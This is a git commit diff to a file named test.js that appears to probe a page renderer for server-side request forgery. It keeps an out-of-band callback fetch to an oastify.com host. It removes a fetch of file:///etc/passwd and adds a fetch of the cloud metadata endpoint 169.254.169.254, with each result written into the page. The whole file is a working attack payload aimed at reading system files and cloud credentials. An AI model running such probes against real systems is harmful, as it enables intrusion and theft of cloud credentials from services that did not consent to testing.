72e9f2f4436d175a17ec95d0e0b3218a81e10a01
vignesh1521 <86752377+vignesh1521@users.noreply.github.com>
2026-09-16 06:54:03 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,15 +1,9 @@
 fetch("http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com")
 
 
-fetch('file:///etc/passwd')
-  .then(r => r.text())
-  .then(t => {
-    var i = document.createElement('div');
-    i.innerText = t;
-    document.body.appendChild(i);
-  })
-  .catch(e => {
-    var i = document.createElement('div');
-    i.innerText = 'err: ' + e.message;
-    document.body.appendChild(i);
-  });
+ 
+   fetch('http://169.254.169.254/latest/meta-data/')
+     .then(r => r.text())
+     .then(t => { var i=document.createElement('div'); i.innerText=t; document.body.appendChild(i); })
+     .catch(e => { var i=document.createElement('div'); i.innerText='err: '+e.message; document.body.appendChild(i); });
+   
